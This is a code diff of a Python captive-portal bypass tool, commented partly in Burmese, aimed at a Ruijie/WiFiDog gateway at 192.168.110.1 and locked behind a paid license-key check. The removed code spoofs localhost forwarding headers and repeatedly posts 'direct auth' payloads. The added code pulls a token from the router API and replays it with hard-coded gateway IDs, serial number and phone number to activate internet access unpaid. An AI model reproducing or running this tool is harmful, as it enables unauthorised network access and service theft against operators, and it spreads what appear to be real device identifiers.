@@ -1,104 +1,100 @@
-import sys, os, hashlib, subprocess, datetime, requests, time, threading
+import sys, os, hashlib, subprocess, datetime, requests, time
 from colorama import Fore, init
 
 init(autoreset=True)
 
-# --- LICENSE SYSTEM ---
+# --- [SECURITY & ENCRYPTION] ---
 SALT = "AHO_PRO_FINAL_2026_SECURE"
 KEY_FILE = os.path.expanduser("~/.aho_key_data")
+
+# --- [TARGET ROUTER DATA - အစ်ကို့ Canary ထဲက အချက်အလက်များ] ---
+TARGET_INFO = {
+    "gw_ip": "192.168.110.1",
+    "username": "810852",
+    "phoneNumber": "381060",
+    "gw_id": "58b4bbd9c1e9",
+    "gw_sn": "H1U42FJ004707"
+}
 
 def get_net_time():
     try:
         res = requests.get('http://worldtimeapi.org/api/timezone/Asia/Yangon', timeout=5)
         return datetime.datetime.strptime(res.json()['datetime'][:10], "%Y-%m-%d")
-    except: return datetime.datetime.now()
+    except:
+        return datetime.datetime.now()
 
 def get_hwid():
-    try:
-        user = subprocess.check_output(['whoami']).decode().strip()
-    except: user = "user"
+    user = subprocess.check_output(['whoami']).decode().strip()
     return f"AHO-{hashlib.md5(user.encode()).hexdigest()[:6].upper()}"
+
+def run_bypass_engine():
+    """Key မှန်သွားရင် တိုက်ရိုက် အလုပ်လုပ်မယ့် Hack Engine"""
+    print(f"\n{Fore.BLUE}[*] Initializing Bypass Engine...")
+    
+    with requests.Session() as s:
+        s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10; K)"})
+        try:
+            # ၁။ Token ကို Router ဆီက နှိုက်မယ်
+            token_url = f"http://{TARGET_INFO['gw_ip']}/cgi-bin/luci/api/auth/token?username={TARGET_INFO['username']}"
+            res = s.get(token_url, timeout=7)
+            token = res.json().get("token", TARGET_INFO['username'])
+            print(f"{Fore.GREEN}[✔] Token Inject: {token}")
+
+            # ၂။ Bypass လုပ်မယ် (GET နှင့် POST နှစ်မျိုးလုံး စမ်းမယ်)
+            auth_url = f"http://{TARGET_INFO['gw_ip']}:2060/wifidog/auth"
+            params = {
+                "token": token,
+                "phoneNumber": TARGET_INFO['phoneNumber'],
+                "gw_id": TARGET_INFO['gw_id'],
+                "gw_sn": TARGET_INFO['gw_sn']
+            }
+            
+            # Request ပစ်သွင်းခြင်း
+            s.get(auth_url, params=params, timeout=10)
+            s.post(auth_url, data=params, timeout=10)
+            
+            print(f"{Fore.YELLOW}----------------------------------------")
+            print(f"{Fore.GREEN}🎉 SUCCESS! INTERNET ACTIVATED.")
+            print(f"{Fore.YELLOW}----------------------------------------")
+            
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error: WiFi ချိတ်ထားလား၊ VPN ပိတ်လား ပြန်စစ်ပါ။")
 
 def check_access():
     uid = get_hwid()
     now = get_net_time()
+
+    # သိမ်းထားသော Key ရှိမရှိ စစ်ခြင်း
     if os.path.exists(KEY_FILE):
         with open(KEY_FILE, "r") as f:
             saved_key = f.read().strip()
-            for i in range(0, 366):
-                check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
-                if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
-                    return True
-    
+        for i in range(0, 366):
+            check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
+            if saved_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
+                return True
+
+    # Key တောင်းသည့် မျက်နှာပြင်
     os.system('clear')
-    print(f"{Fore.CYAN}--- YUTA RUIIJE PENETRATOR ---")
+    print(f"{Fore.MAGENTA}========================================")
+    print(f"{Fore.CYAN}    AHO MASTER BYPASS V2 (OFFICIAL)")
+    print(f"{Fore.MAGENTA}========================================")
     print(f"DEVICE ID: {Fore.YELLOW}{uid}")
-    u_key = input(f"\n{Fore.WHITE}ENTER KEY: ").strip()
+    print(f"{Fore.WHITE}----------------------------------------")
+    
+    user_key = input(f"{Fore.GREEN}ENTER LICENSE KEY: ").strip()
+
+    # Key Validation
     for i in range(0, 366):
         check_date = (now + datetime.timedelta(days=i)).strftime("%Y-%m-%d")
-        if u_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
-            with open(KEY_FILE, "w") as f: f.write(u_key)
+        if user_key == hashlib.md5(f"{uid}|{check_date}|{SALT}".encode()).hexdigest()[:12].upper():
+            with open(KEY_FILE, "w") as f:
+                f.write(user_key)
+            print(f"{Fore.GREEN}[✔] KEY ACTIVATED!")
             return True
     return False
 
-# --- ADVANCED SPOOFING INJECTOR ---
-def ruijie_spoof_inject(host):
-    # Gateway ကို လှည့်စားဖို့ နောက်ဆုံးပေါ် header များ
-    url = f"http://{host}/login/auth"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36",
-        "X-Forwarded-For": "127.0.0.1", # Localhost ကနေ လာသလိုမျိုး လိမ်တာ
-        "X-Real-IP": "127.0.0.1",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "X-Requested-With": "XMLHttpRequest"
-    }
-    
-    # Ruijie Update တွေမှာ သုံးတဲ့ Direct Bypass payloads
-    payloads = [
-        "auth_type=direct&mode=1&is_confirm=1",
-        "auth_type=mac_auth&user_mac=00:00:00:00:00:00",
-        "auth_type=white_list" 
-    ]
-    
-    while True:
-        for data in payloads:
-            try:
-                # Gateway ဆီကို ၅ စက္ကန့်တစ်ခါ အတင်းဝင်ခိုင်းမယ်
-                requests.post(url, data=data, headers=headers, timeout=2)
-            except: pass
-        time.sleep(5)
-
-def start_engine():
-    os.system('clear')
-    target = "192.168.110.1"
-    print(f"{Fore.CYAN}--- YUTA RUJIE DIRECT BYPASS ---")
-    print(f"{Fore.YELLOW}[*] TARGETING GATEWAY: {target}")
-
-    try:
-        sys.path.append(os.getcwd())
-        import core
-        core.IS_LIFETIME = True
-        
-        # ၁။ Core Engine ကို Background မှာ နှိုးမယ်
-        print(f"{Fore.BLUE}[*] Launching Core Engine...")
-        t1 = threading.Thread(target=core.run_bg_bypass if hasattr(core, 'run_bg_bypass') else core.main, daemon=True)
-        t1.start()
-        
-        # ၂။ Spoof Injector ကို နှိုးမယ်
-        print(f"{Fore.MAGENTA}[*] Injecting Spoofed Headers...")
-        t2 = threading.Thread(target=ruijie_spoof_inject, args=(target,), daemon=True)
-        t2.start()
-        
-        print(f"{Fore.GREEN}\n[✔] ENGINE RUNNING... PLEASE WAIT 10-20 SECONDS.")
-        while True:
-            # စက္ကန့်တိုင်း Check လုပ်နေမယ်
-            time.sleep(1)
-            
-    except Exception as e:
-        print(f"{Fore.RED}[✘] Fatal Error: {e}")
-
 if __name__ == "__main__":
     if check_access():
-        start_engine()
+        run_bypass_engine()
     else:
-        sys.exit()
+        print(f"{Fore.RED}[✘] INVALID KEY! PLEASE CONTACT ADMIN.")
